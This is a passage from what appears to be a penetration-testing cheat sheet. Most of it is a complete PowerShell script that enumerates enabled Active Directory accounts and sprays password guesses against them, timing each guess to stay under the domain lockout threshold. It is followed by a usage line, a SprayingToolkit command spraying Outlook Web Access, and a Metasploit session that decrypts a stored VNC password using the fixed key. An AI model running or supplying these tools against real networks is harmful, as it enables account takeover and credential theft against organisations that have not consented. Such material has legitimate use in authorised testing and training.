# Method to retrieve the user objects from the PDC
Function Get-UserObjects
{
    # Get domain info for current domain
    Try {$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()}
    Catch {Write-Verbose "No domain found, will quit..." ; Exit}
   
    # Get the DC with the PDC emulator role
    $PDC = ($domainObj.PdcRoleOwner).Name

    # Build the search string from which the users should be found
    $SearchString = "LDAP://"
    $SearchString += $PDC + "/"
    $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
    $SearchString += $DistinguishedName

    # Create a DirectorySearcher to poll the DC
    $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
    $objDomain = New-Object System.DirectoryServices.DirectoryEntry
    $Searcher.SearchRoot = $objDomain

    # Select properties to load, to speed things up a bit
    $Searcher.PropertiesToLoad.Add("samaccountname") > $Null
    $Searcher.PropertiesToLoad.Add("badpwdcount") > $Null
    $Searcher.PropertiesToLoad.Add("badpasswordtime") > $Null

    # Search only for enabled users that are not locked out - avoid admins unless $admins = $true
    If ($Admins) {$Searcher.filter="(&(samAccountType=805306368)(!(lockoutTime>=1))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"}
    Else {$Searcher.filter="(&(samAccountType=805306368)(!(admincount=1))(!(lockoutTime>=1))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"}
    $Searcher.PageSize = 1000

    # Find & return targeted user accounts
    $userObjs = $Searcher.FindAll()
    Return $userObjs
}

# Method to perform auth test with specific username and password
Function Perform-Authenticate
{
    Param
    ([String]$username,[String]$password)

    # Get current domain with ADSI
    $CurrentDomain = "LDAP://"+([ADSI]"").DistinguishedName

    # Try to authenticate
    Write-Verbose "Trying to authenticate as user '$username' with password '$password'"
    $dom = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain, $username, $password)
    $res = $dom.Name
    
    # Return true/false
    If ($res -eq $null) {Return $false}
    Else {Return $true}
}

# Validate and parse user supplied url to CSV file of passwords
Function Parse-Url
{
    Param ([String]$url)

    # Download password file from URL
    $data = (New-Object System.Net.WebClient).DownloadString($url)
    $data = $data.Split([environment]::NewLine)

    # Parse passwords file and return results
    If ($data -eq $null -or $data -eq "") {Return $null}
    $passwords = $data.Split(",").Trim()
    Return $passwords
}

# Validate and parse user supplied CSV file of passwords
Function Parse-File
{
   Param ([String]$file)

   If (Test-Path $file)
   {
        $data = Get-Content $file
        
        If ($data -eq $null -or $data -eq "") {Return $null}
        $passwords = $data.Split(",").Trim()
        Return $passwords
   }
   Else {Return $null}
}

# Main function to perform the actual brute force attack
Function BruteForce
{
   Param ([Int]$duration,[Int]$threshold,[String[]]$passwords)

   #Setup variables
   $userObj = Get-UserObjects
   Write-Verbose "Found $(($userObj).count) active & unlocked users..."
   
   If ($passwords.Length -gt $threshold)
   {
        $time = ($passwords.Length - $threshold) * $duration
        Write-Host "Total run time is expected to be around $([Math]::Floor($time / 60)) hours and $([Math]::Floor($time % 60)) minutes."
   }

   [Boolean[]]$done = @()
   [Boolean[]]$usersCracked = @()
   [Int[]]$numTry = @()
   $results = @()

   #Initialize arrays
   For ($i = 0; $i -lt $userObj.Length; $i += 1)
   {
        $done += $false
        $usersCracked += $false
        $numTry += 0
   }

   # Main while loop which does the actual brute force.
   Write-Host "Performing brute force - press [q] to stop the process and print results..." -BackgroundColor Yellow -ForegroundColor Black
   :Main While ($true)
   {
        # Get user accounts
        $userObj = Get-UserObjects
        
        # Iterate over every user in AD
        For ($i = 0; $i -lt $userObj.Length; $i += 1)
        {

            # Allow for manual stop of the while loop, while retaining the gathered results
            If ($Host.UI.RawUI.KeyAvailable -and ("q" -eq $Host.UI.RawUI.ReadKey("IncludeKeyUp,NoEcho").Character))
            {
                Write-Host "Stopping bruteforce now...." -Background DarkRed
                Break Main
            }

            If ($usersCracked[$i] -eq $false)
            {
                If ($done[$i] -eq $false)
                {
                    # Put object values into variables
                    $samaccountnname = $userObj[$i].Properties.samaccountname
                    $badpwdcount = $userObj[$i].Properties.badpwdcount[0]
                    $badpwdtime = $userObj[$i].Properties.badpasswordtime[0]
                    
                    # Not yet reached lockout tries
                    If ($badpwdcount -lt ($threshold - 1))
                    {
                        # Try the auth with current password
                        $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]

                        If ($auth -eq $true)
                        {
                            Write-Host "Guessed password for user: '$samaccountnname' = '$($passwords[$numTry[$i]])'" -BackgroundColor DarkGreen
                            $results += $samaccountnname
                            $results += $passwords[$numTry[$i]]
                            $usersCracked[$i] = $true
                            $done[$i] = $true
                        }

                        # Auth try did not work, go to next password in list
                        Else
                        {
                            $numTry[$i] += 1
                            If ($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}
                        }
                    }

                    # One more tries would result in lockout, unless timer has expired, let's see...
                    Else 
                    {
                        $now = Get-Date
                        
                        If ($badpwdtime)
                        {
                            $then = [DateTime]::FromFileTime($badpwdtime)
                            $timediff = ($now - $then).TotalMinutes
                        
                            If ($timediff -gt $duration)
                            {
                                # Since observation window time has passed, another auth try may be performed
                                $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]
                            
                                If ($auth -eq $true)
                                {
                                    Write-Host "Guessed password for user: '$samaccountnname' = '$($passwords[$numTry[$i]])'" -BackgroundColor DarkGreen
                                    $results += $samaccountnname
                                    $results += $passwords[$numTry[$i]]
                                    $usersCracked[$i] = $true
                                    $done[$i] = $true
                                }
                                Else 
                                {
                                    $numTry[$i] += 1
                                    If($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}
                                }

                            } # Time-diff if

                        }
                        Else
                        {
                            # Verbose-log if $badpwdtime in null. Possible "Cannot index into a null array" error.
                            Write-Verbose "- no badpwdtime exception '$samaccountnname':'$badpwdcount':'$badpwdtime'"
	
	
	
				   # Try the auth with current password
        	                $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]
			
                                If ($auth -eq $true)
                                {
                                    Write-Host "Guessed password for user: '$samaccountnname' = '$($passwords[$numTry[$i]])'" -BackgroundColor DarkGreen
                                    $results += $samaccountnname
                                    $results += $passwords[$numTry[$i]]
                                    $usersCracked[$i] = $true
                                    $done[$i] = $true
                                }
                                Else 
                                {
                                    $numTry[$i] += 1
                                    If($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}
                                }
			 
			 
			    
                        } # Badpwdtime-check if

                    } # Badwpdcount-check if

                } # Done-check if

            } # User-cracked if

        } # User loop

        # Check if the bruteforce is done so the while loop can be terminated
        $amount = 0
        For ($j = 0; $j -lt $done.Length; $j += 1)
        {
            If ($done[$j] -eq $true) {$amount += 1}
        }

        If ($amount -eq $done.Length) {Break}

   # Take a nap for a second
   Start-Sleep -m 1000

   } # Main While loop

   If ($results.Length -gt 0)
   {
       Write-Host "Users guessed are:"
       For($i = 0; $i -lt $results.Length; $i += 2) {Write-Host " '$($results[$i])' with password: '$($results[$i + 1])'"}
   }
   Else {Write-Host "No passwords were guessed."}
}

$passwords = $null

If ($Url -ne '')
{
    $passwords = Parse-Url $Url
}
ElseIf($File -ne '')
{
    $passwords = Parse-File $File
}
Else
{
    $passwords = $Pass.Split(",").Trim()   
}

If($passwords -eq $null)
{
    Write-Host "Error in password input, please try again."
    Exit
}

# Get password policy info
$duration = Get-Duration
$threshold = Get-threshold

If ($Admins) {Write-Host "WARNING: also targeting admin accounts." -BackgroundColor DarkRed}

# Call the main function and start the brute force
BruteForce $duration $threshold $passwords
```

### Usage

```c
PS C:\> .\Spray-Passwords.ps1 -Pass <PASSWORD> -Admin
```

## SprayingToolkit

> https://github.com/byt3bl33d3r/SprayingToolkit

### OWA

```c
$ python3 atomizer.py owa <RHOST> <PASSWORDS> <USERNAMES> -i 0:0:01
```

## VNC Password Recovery

```c
msf6 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can't alias jobs from irb_jobs.
>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
>> require 'rex/proto/rfb'
=> true
>> Rex::Proto::RFB::Cipher.decrypt ["6bcf2a4b6e5aca0f"].pack('H*'), fixedkey
=> "sT333ve2"
>>
```
